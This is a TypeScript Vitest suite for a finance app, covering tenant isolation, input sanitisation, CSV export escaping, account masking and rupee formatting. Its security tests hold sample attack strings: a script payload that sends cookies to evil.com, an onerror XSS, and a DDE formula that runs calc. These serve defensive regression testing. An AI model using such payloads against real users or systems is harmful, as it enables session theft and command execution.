class MemoryStorage {
  private store: Map<string, string> = new Map();

  getItem(key: string): string | null {
    return this.store.has(key) ? this.store.get(key)! : null;
  }

  setItem(key: string, value: string): void {
    this.store.set(key, String(value));
  }

  removeItem(key: string): void {
    this.store.delete(key);
  }

  clear(): void {
    this.store.clear();
  }

  get length(): number {
    return this.store.size;
  }

  key(index: number): string | null {
    const keys = Array.from(this.store.keys());
    return keys[index] ?? null;
  }
}

if (typeof globalThis.localStorage === 'undefined') {
  (globalThis as any).localStorage = new MemoryStorage();
}

import { describe, it, expect, beforeEach } from 'vitest';
import { sanitizeString, sanitizeCsvCell, maskSensitive } from '../lib/security';
import { auditLogger } from '../lib/auditLogger';
import { store } from '../lib/storage';
import { formatINR, formatINRCompact } from '../lib/calculations';
import { exportTransactionsToCsv } from '../lib/csvParser';
import { Transaction } from '../types';

describe('PAISA Level 06 QA — Security Regression & Accessibility Review Suite', () => {
  const TENANT_ALICE = 'usr_qa_tenant_alice';
  const TENANT_BOB = 'usr_qa_tenant_bob';

  beforeEach(() => {
    localStorage.clear();
    auditLogger.clearLogs();
  });

  // ============================================================================
  // 1. Security Regression Checks (Level 3 Verification Across All Entities)
  // ============================================================================
  describe('1. Security Controls & Tenant Boundary Regressions', () => {
    it('prevents cross-tenant access across recurring bills, savings goals, and accounts', () => {
      // 1. Alice creates recurring bill
      const aliceBill = store.addRecurringPayment({
        id: 'bill_alice_1',
        user_id: TENANT_ALICE,
        name: 'Alice Private Rent',
        amount: 30000,
        category_id: 'cat_rent',
        frequency: 'monthly',
        next_due_date: '2026-11-01',
        is_active: true,
        auto_record: false,
      }, TENANT_ALICE);

      // Bob tries to delete Alice's recurring bill
      const deleteBillByBob = store.deleteRecurringPayment(aliceBill.id, TENANT_BOB);
      expect(deleteBillByBob).toBe(false);
      expect(store.getRecurringPayments(TENANT_ALICE).length).toBe(1);

      // 2. Alice creates savings goal
      const aliceGoal = store.addSavingsGoal({
        id: 'goal_alice_1',
        user_id: TENANT_ALICE,
        name: 'Alice Diamond Fund',
        target_amount: 500000,
        current_amount: 100000,
        target_date: '2027-12-31',
        icon: 'Sparkles',
        category: 'purchase',
      }, TENANT_ALICE);

      // Bob tries to delete Alice's savings goal
      const deleteGoalByBob = store.deleteSavingsGoal(aliceGoal.id, TENANT_BOB);
      expect(deleteGoalByBob).toBe(false);
      expect(store.getSavingsGoals(TENANT_ALICE).length).toBe(1);

      // 3. Alice creates bank account
      const aliceAcc = store.addAccount({
        id: 'acc_alice_1',
        user_id: TENANT_ALICE,
        account_name: 'Alice Swiss Vault',
        account_type: 'savings',
        provider: 'HDFC Bank',
        balance: 1000000,
        connection_status: 'connected',
        is_demo: false,
      }, TENANT_ALICE);

      // Bob tries to delete Alice's account
      store.deleteAccount(aliceAcc.id, TENANT_BOB);
      expect(store.getAccounts(TENANT_ALICE).some(a => a.id === aliceAcc.id)).toBe(true);

      // All 3 violations must be logged with CROSS_TENANT_VIOLATION_ATTEMPT
      const violationLogs = auditLogger.getLogs().filter(l => l.eventType === 'CROSS_TENANT_VIOLATION_ATTEMPT');
      expect(violationLogs.length).toBeGreaterThanOrEqual(3);
    });

    it('neutralizes malicious XSS and script payloads on transaction inputs', () => {
      const maliciousMerchant = '<script>window.location="http://evil.com?c="+document.cookie</script>Coffee Shop';
      const maliciousNotes = '<img src="x" onerror="alert(document.domain)">Urgent Payment';

      const sanitizedMerchant = sanitizeString(maliciousMerchant);
      const sanitizedNotes = sanitizeString(maliciousNotes);

      expect(sanitizedMerchant).not.toContain('<script>');
      expect(sanitizedMerchant).not.toContain('</script>');
      expect(sanitizedNotes).not.toContain('onerror');

      // Storing into transaction must sanitize automatically
      const tx = store.addTransaction({
        user_id: TENANT_ALICE,
        transaction_date: '2026-10-31',
        merchant: maliciousMerchant,
        description: maliciousNotes,
        notes: maliciousNotes,
        amount: 250,
        transaction_type: 'expense',
        category_id: 'cat_food',
        payment_method: 'UPI',
      });

      expect(tx.merchant).not.toContain('<script>');
      expect(tx.description).not.toContain('onerror');
      expect(tx.notes).not.toContain('onerror');
    });

    it('neutralizes CSV formula injection attacks (DDE / Excel Command Execution)', () => {
      const csvPayloads = [
        '=cmd|\' /C calc\'!A0',
        '+10+20',
        '-5+2',
        '@SUM(A1:A10)',
      ];

      for (const payload of csvPayloads) {
        const escaped = sanitizeCsvCell(payload);
        // OWASP CSV Injection Rule: Must prefix leading =, +, -, @ with single quote
        expect(escaped.startsWith("'")).toBe(true);
      }

      // Test within full CSV export
      const txs: Transaction[] = [
        {
          id: 'tx_csv_hack',
          user_id: TENANT_ALICE,
          transaction_date: '2026-10-31',
          merchant: '=cmd|\' /C calc\'!A0',
          description: '+99999',
          amount: 100,
          transaction_type: 'expense',
          category_id: 'cat_food',
          payment_method: 'UPI',
          created_at: new Date().toISOString(),
          updated_at: new Date().toISOString(),
        },
      ];

      const csvDump = exportTransactionsToCsv(txs);
      expect(csvDump).toContain("\"'=cmd");
      expect(csvDump).toContain("\"'+99999");
    });

    it('masks sensitive account numbers and personal financial identifiers', () => {
      expect(maskSensitive('123456789012')).toBe('•••• 9012');
      expect(maskSensitive('4532111122223333')).toBe('•••• 3333');
      expect(maskSensitive('123')).toBe('•••• 123');
    });
  });

  // ============================================================================
  // 2. Accessibility, Usability & UI Value Boundaries
  // ============================================================================
  describe('2. Accessibility Semantics & Value Boundaries', () => {
    it('handles extreme financial figures up to 100 Crore without NaN or UI layout truncation', () => {
      const oneCrore = 10000000;
      const fiftyCrore = 500000000;

      const formatted1Cr = formatINR(oneCrore);
      const compact50Cr = formatINRCompact(fiftyCrore);

      expect(formatted1Cr).toContain('1,00,00,000.00');
      expect(compact50Cr).toBe('₹50.00 Cr');
      expect(formatted1Cr).not.toContain('NaN');
      expect(compact50Cr).not.toContain('NaN');
    });

    it('handles ultra-long merchant and description strings safely', () => {
      const veryLongString = 'A'.repeat(500);
      const sanitized = sanitizeString(veryLongString);

      expect(sanitized.length).toBeLessThanOrEqual(500);
      expect(sanitized).not.toContain('<');
      expect(sanitized).not.toContain('>');
    });

    it('formats zero and fractional paise balances correctly for screen readers', () => {
      expect(formatINR(0)).toBe('₹0.00');
      expect(formatINR(0.05)).toBe('₹0.05');
      expect(formatINR(12.5)).toBe('₹12.50');
    });
  });
});
